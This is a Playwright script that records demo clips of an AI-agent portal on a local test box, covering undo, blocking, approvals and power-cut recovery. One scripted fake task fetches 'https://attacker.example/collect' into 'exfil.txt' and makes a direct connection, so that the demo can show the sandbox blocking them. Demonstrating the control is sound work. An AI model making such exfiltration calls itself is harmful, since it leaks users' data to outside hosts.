// Records the showcase's evidence clips and stills against the clip box (clip-box.sh, port 7795).
//   PLAYWRIGHT=/tmp/showcase-rec/node_modules/playwright/index.mjs node record.mjs <clip>...
// (playwright lives in a scratch dir, not in showcase/, so it is imported by path)
// Raw videos land in $OUT/raw (default /tmp/showcase-rec/out); encode.sh turns them into MP4s.
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';

const { chromium } = await import(process.env.PLAYWRIGHT ?? 'playwright');
const BOX = 'http://127.0.0.1:7795';
const OUT = process.env.OUT ?? '/tmp/showcase-rec/out';
const SHOTS = process.env.SHOTS ?? path.resolve(import.meta.dirname, '../../src/assets/shots');
const BOXSH = path.resolve(import.meta.dirname, 'clip-box.sh');
const DESK = { width: 1600, height: 900 };
const PHONE = { width: 390, height: 844 };
fs.mkdirSync(`${OUT}/raw`, { recursive: true });
fs.mkdirSync(SHOTS, { recursive: true });

const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const api = async (method, p, body) => {
  const r = await fetch(BOX + p, { method, headers: { 'content-type': 'application/json' }, body: body && JSON.stringify(body) });
  if (!r.ok) throw new Error(`${method} ${p}: ${r.status} ${await r.text()}`);
  return r.json();
};
const task = (spec) => api('POST', '/api/tasks', { worker: 'fake', source: 'portal', ...spec });
const until = async (fn, ms = 30000) => {
  for (const end = Date.now() + ms; Date.now() < end; await wait(300)) if (await fn()) return;
  throw new Error('timed out waiting');
};
const state = async (id) => (await api('GET', `/api/tasks/${id}`)).task.state;

// A visible pointer, because recorded video has none. Lives in the top document only.
const CURSOR = () => {
  if (window.top !== window) return;
  const put = () => {
    const d = document.createElement('div');
    d.id = '__cursor';
    d.style.cssText = 'position:fixed;left:-40px;top:-40px;width:22px;height:22px;margin:-11px 0 0 -11px;border-radius:50%;' +
      'background:rgba(242,239,232,.55);border:2px solid #1c201d;box-shadow:0 0 0 2px rgba(242,239,232,.8);z-index:2147483647;pointer-events:none;transition:transform .12s';
    document.documentElement.appendChild(d);
    window.__cur = (x, y, down) => { d.style.left = x + 'px'; d.style.top = y + 'px'; d.style.transform = down ? 'scale(.7)' : 'scale(1)'; };
  };
  document.readyState === 'loading' ? addEventListener('DOMContentLoaded', put) : put();
};

async function open(browser, name, { viewport = DESK, scale = 1, url = '/screen' } = {}) {
  const ctx = await browser.newContext({
    viewport, deviceScaleFactor: scale,
    // Video frames are CSS pixels whatever the scale, so the video is the viewport's size.
    recordVideo: name ? { dir: `${OUT}/raw/${name}`, size: viewport } : undefined,
  });
  await ctx.addInitScript(CURSOR);
  const t0 = Date.now();
  const page = await ctx.newPage();
  page.t0 = t0;
  page.pos = { x: viewport.width * 0.62, y: viewport.height * 0.7 };
  await page.goto(BOX + url);
  await page.waitForTimeout(2500);
  await page.evaluate(({ x, y }) => window.__cur?.(x, y), page.pos);
  return page;
}

async function moveTo(page, x, y, ms = 700) {
  const n = Math.max(8, Math.round(ms / 25)), { x: x0, y: y0 } = page.pos;
  for (let i = 1; i <= n; i++) {
    const t = i / n, e = t < 0.5 ? 2 * t * t : 1 - (-2 * t + 2) ** 2 / 2;
    const xi = x0 + (x - x0) * e, yi = y0 + (y - y0) * e;
    await page.mouse.move(xi, yi);
    await page.evaluate(([a, b]) => window.__cur?.(a, b), [xi, yi]);
    await page.waitForTimeout(ms / n);
  }
  page.pos = { x, y };
}

async function click(page, locator, { pause = 350 } = {}) {
  const loc = typeof locator === 'string' ? page.locator(locator).first() : locator;
  await loc.waitFor({ state: 'visible', timeout: 30000 });
  await loc.scrollIntoViewIfNeeded();
  const b = await loc.boundingBox();
  await moveTo(page, b.x + b.width / 2, b.y + b.height / 2);
  await page.waitForTimeout(pause);
  await page.evaluate(([a, b2]) => window.__cur?.(a, b2, true), [page.pos.x, page.pos.y]);
  await loc.click();
  await page.waitForTimeout(140);
  await page.evaluate(([a, b2]) => window.__cur?.(a, b2, false), [page.pos.x, page.pos.y]);
}

async function finish(page, name) {
  const v = page.video();
  await page.context().close();
  if (v) { const src = await v.path(); fs.renameSync(src, `${OUT}/raw/${name}.webm`); console.log('raw', `${OUT}/raw/${name}.webm`); }
}

// --- clips (portal v2: top bar, dock, windows, Notification Center) ----------------------------------------

const dock = (page, label) => page.locator(`.gos-dock-item[aria-label^="${label}"], .gos-dock-item[title^="${label}"]`).first();
const banner = (page, text) => page.locator('.gos-banners .gos-note', { hasText: text }).first();
const glide = async (page, loc, dx = 0.5, dy = 0.5, ms = 900) => {
  const b = await loc.boundingBox({ timeout: 5000 }).catch(() => null);
  if (b) await moveTo(page, b.x + b.width * dx, b.y + b.height * dy, ms);
};

const clips = {
  async 'moment-1-undo'(browser) {
    const b = await task({ title: 'Plan the Lisbon trip', workspace: 'notes', prompt: 'write trip.md # Lisbon\nappend trip.md Flights booked for Nov 12.\nappend notes.md Lisbon trip planned.' });
    await until(async () => (await state(b.id)) === 'done');
    const c = await task({ title: 'Clean up the notes folder', workspace: 'notes', prompt: 'rm notes.md\nwrite cleanup.txt Removed 1 old file: notes.md' });
    await until(async () => (await state(c.id)) === 'done');
    const page = await open(browser, 'moment-1-undo');
    await page.waitForTimeout(800);
    await click(page, dock(page, 'Tasks'));
    await page.waitForTimeout(1500);
    const row = page.locator('.g-tr', { hasText: 'Clean up the notes folder' });
    await click(page, row);
    await row.dblclick().catch(() => {});
    await page.getByText('Files it changed').first().waitFor({ timeout: 5000 }).catch(() => page.evaluate((id) => (location.hash = `task/${id}`), c.id));
    await page.waitForTimeout(2000);
    await glide(page, page.getByText('Files it changed').first(), 0.5, 3);
    await page.waitForTimeout(2000);
    await click(page, page.getByRole('button', { name: 'Undo task', exact: true }).last());
    await page.waitForTimeout(1200);
    await click(page, page.locator('dialog .g-alert-actions button').last());
    await page.waitForTimeout(2500);
    await click(page, dock(page, 'Time Machine'));
    await page.waitForTimeout(1500);
    const ws = page.locator('.g-sidebar-item', { hasText: 'notes' });
    if (await ws.count()) await click(page, ws.first());
    await page.waitForTimeout(1200);
    await glide(page, page.locator('.gos-w-stack'), 0.5, 0.2);
    await page.waitForTimeout(1200);
    await glide(page, page.locator('.gos-w-layer', { hasText: 'Clean up the notes folder' }), 0.7, 0.5, 700);
    await page.waitForTimeout(2000);
    await glide(page, page.locator('.gos-w-layer', { hasText: 'Plan the Lisbon trip' }), 0.7, 0.5, 700);
    await page.waitForTimeout(3000);
    await finish(page, 'moment-1-undo');
  },

  async 'moment-2-blocked'(browser) {
    const page = await open(browser, 'moment-2-blocked');
    await page.waitForTimeout(1500);
    await task({
      title: 'Find me a road bike', workspace: 'notes', hosts: ['example.com'],
      prompt: 'fetch http://example.com/ page.html\nsleep 3\nfetch https://attacker.example/collect exfil.txt\nconnect 1.1.1.1:443 direct.txt\nwrite bikes.md Two road bikes under 600 dollars.',
    });
    const n = banner(page, /blocked/i);
    await n.waitFor({ timeout: 30000 });
    await page.waitForTimeout(800);
    await glide(page, n, 0.5, 0.45);
    await page.waitForTimeout(2500);
    await click(page, n.locator('.gos-two'));
    await page.waitForTimeout(2000);
    await glide(page, page.getByText(/not allowed to do/).first(), 0.4, 0.5);
    await page.waitForTimeout(3000);
    await glide(page, page.getByText(/^Blocked:/).first(), 0.4, 0.5, 800);
    await page.waitForTimeout(3500);
    await finish(page, 'moment-2-blocked');
  },

  async 'moment-3-approval'(browser) {
    const box = await open(browser, 'moment-3-box');
    const phone = await open(browser, 'moment-3-phone', { viewport: PHONE, scale: 2, url: '/' });
    await box.waitForTimeout(1500);
    await task({
      title: 'Renew the domain', tools: ['example.spend'], budgetCents: 1000,
      prompt: 'call example.spend {"cents":1500,"on":"renewing the photo site domain for a year"}\nwrite renewed.txt Renewed until next October.',
    });
    await banner(box, 'Renew the domain').waitFor({ timeout: 30000 });
    const card = phone.locator('section, li, article, div').filter({ hasText: 'Renew the domain' }).filter({ has: phone.getByRole('button', { name: 'Approve' }) }).last();
    const approve = card.getByRole('button', { name: 'Approve' }).first();
    await approve.waitFor({ timeout: 30000 });
    await phone.waitForTimeout(3500);
    await click(phone, approve, { pause: 600 });
    await box.waitForTimeout(6000);
    fs.writeFileSync(`${OUT}/raw/moment-3-offsets.json`, JSON.stringify({ box: box.t0, phone: phone.t0 }));
    await finish(phone, 'moment-3-phone');
    await finish(box, 'moment-3-box');
  },

  async 'moment-4-power-cut'(browser) {
    const lines = Array.from({ length: 60 }, (_, i) => `append albums.txt album ${i + 1} counted\nsleep 1`).join('\n');
    await task({ title: 'Count the photo albums', prompt: lines });
    await wait(2500);
    const page = await open(browser, 'moment-4-power-cut');
    const run = page.locator('.gos-widget-card', { hasText: 'Running' });
    await glide(page, run, 0.5, 0.7);
    await page.waitForTimeout(3500);
    execFileSync(BOXSH, ['kill'], { stdio: 'inherit' });
    await page.waitForTimeout(7000);
    execFileSync(BOXSH, ['boot'], { stdio: 'inherit' });
    await page.getByText('Welcome back').first().waitFor({ timeout: 40000 });
    await page.waitForTimeout(2500);
    await glide(page, page.locator('.gos-desk-sub'), 0.5, 0.5);
    await page.waitForTimeout(3000);
    await glide(page, run, 0.5, 0.7);
    await page.waitForTimeout(3500);
    await finish(page, 'moment-4-power-cut');
  },

  async shopper(browser) {
    await api('POST', '/t/shopper/store/admin', { sku: 'HV60-100', priceCents: 899, inStock: true });
    const w = await api('POST', '/t/shopper/watches', { store: 'test', product: 'HV60-100', maxCents: 700, qty: 2 });
    await wait(6000);
    const page = await open(browser, 'shopper', { url: '/screen#app/shopper/shopper' });
    await page.waitForTimeout(2000);
    await glide(page, page.locator('.gos-track-frame'), 0.45, 0.55);
    await page.waitForTimeout(2500);
    await api('POST', '/t/shopper/store/admin', { sku: 'HV60-100', priceCents: 650 });
    await api('POST', '/t/shopper/watches/check', { id: w.id ?? w.watch?.id });
    const n = banner(page, /Hario|Buy/);
    await n.waitFor({ timeout: 60000 });
    await page.waitForTimeout(3500);
    await click(page, n.getByRole('button', { name: /^Approve/ }), { pause: 700 });
    await page.waitForTimeout(6000);
    await finish(page, 'shopper');
  },

  async 'credit-desk'(browser) {
    const page = await open(browser, 'credit-desk', { url: '/screen#app/credit-desk/credit-desk' });
    await page.waitForTimeout(1500);
    await api('POST', '/t/credit-desk/run', { case: 'fogline-2026-10', scripted: true });
    const n = banner(page, /APP-1043|fraud/i);
    await n.waitFor({ timeout: 60000 });
    await page.waitForTimeout(1000);
    await glide(page, n, 0.5, 0.45);
    await page.waitForTimeout(4000);
    await click(page, n.getByRole('button', { name: /^Approve/ }), { pause: 700 });
    await page.waitForTimeout(2000);
    // The rest of the controller's questions are answered off screen, so the run can finish and be scored.
    for (const end = Date.now() + 60000; Date.now() < end; await wait(1000)) {
      const pend = await api('GET', '/api/approvals?state=pending');
      for (const a of pend) await api('POST', `/api/approvals/${encodeURIComponent(a.id)}`, { approved: true, by: 'controller' }).catch(() => {});
      const runs = await api('GET', '/t/credit-desk/runs').catch(() => null);
      const r = Array.isArray(runs) ? runs[0] : runs?.runs?.[0];
      if (r && (r.seats ?? r.tasks ?? []).every((t) => ['done', 'failed'].includes(t.state))) { await api('POST', '/t/credit-desk/score', { run: r.run ?? r.id }).catch(() => {}); break; }
    }
    await page.evaluate(() => document.querySelector('.gos-track-frame')?.contentWindow?.location.reload());
    await page.waitForTimeout(3000);
    await glide(page, page.locator('.gos-track-frame'), 0.5, 0.35);
    await page.waitForTimeout(2500);
    await page.mouse.wheel(0, 500);
    await page.waitForTimeout(3500);
    await finish(page, 'credit-desk');
  },
};

// Stills of the track apps in v2's windows. Desktop, task and phone stills come from portal/screenshots/.
clips.stills = async (browser) => {
  const desk = await open(browser, null);
  await desk.evaluate(() => document.getElementById('__cursor')?.remove());
  const shot = async (name, hash, ms = 3000) => {
    await desk.evaluate((h) => (location.hash = h), hash);
    await desk.waitForTimeout(ms);
    await desk.screenshot({ path: `${SHOTS}/${name}.png` });
    console.log('shot', name);
  };
  await shot('app-shopper', '#app/shopper/shopper');
  await shot('app-store', '#app/shopper/store');
  await shot('app-wallet', '#app/wallet/wallet', 6000);
  await shot('app-credit-desk', '#app/credit-desk/credit-desk', 4000);
  await desk.context().close();
};

const which = process.argv.slice(2);
const browser = await chromium.launch();
try {
  for (const name of which) {
    if (!clips[name]) throw new Error(`no clip ${name}; have ${Object.keys(clips).join(', ')}`);
    console.log('recording', name);
    await clips[name](browser);
  }
} finally {
  await browser.close();
}
